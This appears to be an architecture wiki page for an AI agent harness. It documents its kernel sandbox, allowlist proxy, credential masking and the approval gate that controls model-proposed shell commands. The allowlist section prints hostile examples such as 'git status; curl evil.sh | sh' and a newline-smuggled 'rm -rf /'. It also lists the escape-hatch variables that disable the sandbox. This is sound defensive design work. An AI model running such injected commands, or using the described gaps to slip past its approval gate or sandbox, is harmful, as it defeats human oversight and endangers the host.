---
Title: OS Sandbox
Version: 1.1.0
Type: architecture
Status: accepted
Summary: ""
---
```markdown
---
Title: OS Sandbox
Version: 1.1.0
Type: architecture
Status: accepted
Summary: Kernel-enforced containment layer that constrains what a process can do after the policy engine approves it. Uses macOS Seatbelt or Linux bubblewrap to restrict filesystem access, network reach, and credential exposure. Containment is mandatory for autonomous runs and opt-in for interactive agent sessions. When containment cannot be applied, execution is refused rather than silently degraded.
---
# OS Sandbox

VerifiedAt: 7d38dba02fad6f8f81d8f244f76b08d0b2f59682
VerifiedScope: sha256:5850b7e87a1e0e8035bab240df4bba7039db1e1f6bb3335b109c58311a5806e4

## Summary

The OS sandbox is a kernel-enforced containment layer that sits *below* keryx's
policy engine, structural command guard, env allowlist, and approval gate. Those
layers decide **whether a command may start**; the OS sandbox constrains **what
the process can do once running** — which paths it can write, which secrets it
can read, and which network it can reach — using macOS Seatbelt (`sandbox-exec`)
or Linux bubblewrap (`bwrap`). It adds no npm dependencies: containment is
delegated to system binaries. When containment cannot be applied, a run is
**refused**, never silently downgraded.

## Entry Paths and Defaults

| Path | Default | Rationale |
|---|---|---|
| `keryx harness exec` (autonomous) | **contained by default** | No human reviews each command; containment cannot be optional. |
| Agent `shell_exec` (interactive) | **opt-in** via `KERYX_SANDBOX_SHELL` | A human approves every command, and default-on breaks tools writing to global caches (`~/.bun`, `~/.npm`, `~/.cargo`) — which trains users to disable the sandbox outright. |

## Sandbox Profile

A `SandboxProfile` is projected from the policy profile and carries:

- **Filesystem `mode`**: `read-only` | `workspace-write` | `danger-full-access`
- **Network `mode`**: `off` | `on` | `restricted`
- **Writable roots**: explicitly permitted write paths
- **Secret read-deny list**: paths masked from the contained process
- **Allowed domains**: hostname patterns for restricted network
- **Proxy address**: optional loopback proxy for restricted network
- **`required`**: fail-closed flag

### Default Posture (v1)

- **Network**: off
- **Writes**: restricted to the working directory and session temp dir
- **Reads**: all other host paths are read-only
- **Masked paths**: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.config/keryx`, `~/.netrc`

## Restricted Network Mode

When `network: restricted`, the OS layer denies all direct network access. The contained process can only reach hosts through a loopback allowlist proxy, pointed at via `HTTP(S)_PROXY`.

### Proxy Behavior

- The proxy enforces the domain allowlist (e.g., `*.d.com` covers apex `d.com`)
- Every allow/deny decision is reported back to the caller
- A denied host receives a `403` response

This reporting is **load-bearing**: `curl` treats a `403` as a successful HTTP transaction and exits `0`. Without explicit decision reporting, a blocked request is indistinguishable from a successful one.

### Implementation Note

The proxy runs in a **worker thread** because the contained command is spawned with `spawnSync`, which blocks the main event loop for the entire run.

## Credential Masking and TLS Termination

A masked credential never enters the contained process. Instead, the process receives a per-run sentinel (`keryx-sentinel-<uuid>`), and the proxy substitutes the real value on the wire — but only for named hosts.

### HTTPS Requirement

Over HTTPS, TLS termination is mandatory. A blind `CONNECT` relay cannot rewrite encrypted bytes. Therefore, `--mask-env` without `--tls-terminate` is **rejected** rather than silently half-working.

### Run CA Trust Delivery

Trust in the run CA is delivered through environment variables only:

- `SSL_CERT_FILE`
- `CURL_CA_BUNDLE`
- `NODE_EXTRA_CA_CERTS`
- `REQUESTS_CA_CERTS`
- `GIT_SSL_CAINFO`

The run CA is **never** added to the system trust store, because a run-scoped MITM certificate must not become a host-wide trust decision.

### Go Tool Limitation

Go's `crypto/tls` ignores these environment variables. Go tools (`gh`, `terraform`, `kubectl`, `docker`) therefore fail under TLS termination. This is a known, documented limitation.

## Platform Matrix

| Capability | macOS | Linux | Windows |
|---|---|---|---|
| Filesystem containment, secret masking | yes | yes | no launcher |
| Network off | yes | yes | no launcher |
| Domain allowlist, credential masking, TLS termination | yes | **fails closed** | no launcher |

### Linux Network Restriction

Restricted network requires "deny all network except this one loopback socket". Seatbelt expresses this directly. Bubblewrap cannot — `--unshare-net` gives the process its own loopback, not the one the proxy listens on — so it would need a network namespace plus a relay. This is not built; Linux falls back to fail-closed.

## The Approval Gate: The Layer That Is Usually Load-Bearing

Because agent `shell_exec` defaults to **off**, the layer that actually stands between a model-proposed command and the host is almost always the approval gate, not the OS sandbox. On a host without a launcher installed, the approval gate is the **only** layer at all.

Anyone reasoning about the security of the interactive agent should start here.

### Default-Deny Contract

- `runAgentTurn` never executes a `shell`-risk tool without an approver returning approval
- An absent approver is a denial
- A user allowlist (`~/.local/share/keryx/permissions.json`) provides glob patterns that auto-approve without prompting

### Allowlist Pattern Matching: A Critical Warning

**A pattern matched against the raw command string is not a boundary by itself.**

The string it matches is handed to `/bin/sh -c`, which re-interprets it. A bare `*` expands to "any run of characters **including newlines**".

Real-world examples from live allowlists:

| Pattern | Actual Coverage |
|---|---|
| `git *` | `git status; curl evil.sh \| sh` |
| `cd *` | `cd /tmp && …` |
| `# *` | `"# note\nrm -rf /"` |

This was not theoretical — flow 115 observed `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`, `sudo *`, and the exact string `rm -rf /` on two hosts.

### Four Allowlist Constraints

| Rule | Applies To | Effect |
|---|---|---|
| **Unquoted metacharacters** | the command | `; && \|\| \| \` $( < > &` or a newline outside quotes ⇒ never auto-approved, never remembered. Quote-aware, so `git commit -m "fix: a; b"` is unaffected. |
| **Destructive classification** | the command | A destructive command is never auto-approved and never remembered, however exactly a pattern matches it. |
| **Own-credential access** | the command | Any mention of `permissions.json` / `auth.json` / keryx config dirs forces a prompt and can never be remembered — otherwise one approved command disables the gate permanently. |
| **No bare interpreter grants** | the pattern | `<interpreter> *` is refused (`bash *`, `docker *`, `git *`, …). A narrower pattern that constrains arguments (`bun test*`) is still allowed. |

### Why Rules Apply to the Command, Not the Pattern

The first three rules deliberately apply to the **command**, not the pattern. A pattern written by an older keryx or hand-edited into the file has not passed validation. Loading partitions stored patterns and reports refused ones instead of deleting them; the session also fingerprints the file and warns if it changes underneath.

### Known Limitations

1. **Destructive classifier escalates, never blocks**: Any list of dangerous commands is incomplete, and a check that reads as a grant is worse than no check. The classifier escalates confirmation ([ADR-0009](../../../docs/decisions/keryx-harness/ADR-0009-destructive-command-escalation.md)).

2. **Interpreter list is expedient, not a boundary**: The metacharacter rule and the classifier are the actual boundaries.

3. **Heredocs and redirects trigger prompts**: A heredoc or redirect (`cat > f <<'EOF'`) carries metacharacters, so it asks every time. Separating a redirect from a heredoc body needs a shell parser, which is a worse failure surface than one extra confirmation.

## Fail-Closed Behavior

A missing launcher or an unsupported posture produces a `blocked` outcome with a stated reason. There is no code path that runs a command uncontained after containment was requested.

Explicit escape hatches exist for edge cases:

- `KERYX_DANGEROUSLY_DISABLE_SANDBOX=1`
- `KERYX_SANDBOX_ALLOW_UNSANDBOXED=1`

These are human-set and must be explicitly enabled.

## Verification Discipline

A sandbox that fails to launch blocks everything — which looks exactly like perfect containment. Every boundary is therefore verified as a **pair**:

1. The denied case fails
2. The allowed case succeeds

This discipline caught a real defect: bubblewrap masked secret paths unconditionally, and mounting over a non-existent path aborts the whole sandbox. The Linux sandbox failed to start on any host lacking `~/.aws` or `~/.gnupg`.

## Related Code

| Module | Purpose |
|---|---|
| `src/harness/process/sandbox/` | Profile, launchers, dispatcher, adapter, proxy, run CA |
| `src/harness/process/sandbox/profile.ts` | `SandboxProfile`, policy projection |
| `src/harness/process/sandbox/seatbelt.ts` | macOS launcher |
| `src/harness/process/sandbox/bwrap.ts` | Linux launcher |
| `src/harness/process/sandbox/wrap.ts` | Platform dispatch, unsupported-posture refusal |
| `src/harness/process/sandbox/adapter.ts` | Fail-closed `ProcessAdapter` decorator |
| `src/harness/process/sandbox/proxy.ts` | Allowlist proxy |
| `src/harness/process/sandbox/network-run.ts` | Run lifecycle |
| `src/commands/harness.ts` | `keryx harness exec` CLI surface |
| `src/harness/tool/builtin/shell-exec-tool.ts` | Agent shell opt-in |
| `src/commands/agent.ts` | Default-deny risk gate, approval binding, escalation |
| `src/lib/shell-permissions.ts` | Allowlist and three command-level barriers |
| `src/lib/command-risk.ts` | Destructive classification, own-credential detection |
| `src/lib/shell-syntax.ts` | Quote-aware scanner for both classifiers |

## Documentation Package

Full documentation lives in `docs/requirements/keryx-os-sandbox/`:

- [README](../../../docs/requirements/keryx-os-sandbox/README.md) — index, status, platform matrix
- [PRD](../../../docs/requirements/keryx-os-sandbox/prd.md) — problem, goals, risks, gaps
- [Specification](../../../docs/requirements/keryx-os-sandbox/specification.md) — profile shape, launcher details, CLI/env surface, contracts
- [Operator Guide](../../../docs/requirements/keryx-os-sandbox/operator-guide.md) — for humans
- [Agent Protocol](../../../docs/requirements/keryx-os-sandbox/agent-protocol.md) — for agents
- [Verification Record](../../../docs/requirements/keryx-os-sandbox/verification.md) — what was proven and what was not
- [Linux verification runbook](../../../docs/verification/linux-sandbox-verification.md) — manual validation on a real host

### Related Decisions

- [ADR-0006: OS Sandbox Shell Exec](../../../docs/decisions/keryx-harness/ADR-0006-os-sandbox-shell-exec.md)
- [ADR-0007: TLS Terminate HTTPS Credential Masking](../../../docs/decisions/keryx-harness/ADR-0007-tls-terminate-https-credential-masking.md)

## Related Wiki

- [Wiki Index](../index.md)
- [src/harness](../components/src-harness.md)
- [src/commands](../components/src-commands.md)

## Changelog

| Version | Changes |
|---|---|
| 1.1.0 | Added the approval-gate / allowlist permission model and its limits: the page described containment but not the layer that is load-bearing when containment is off (the default) or unavailable. |
| 1.0.0 | Documented the implemented OS sandbox: postures, restricted network, credential masking, TLS termination, platform matrix, fail-closed contract, and the documentation package. |
| 0.1.0 | Initial version. |
```
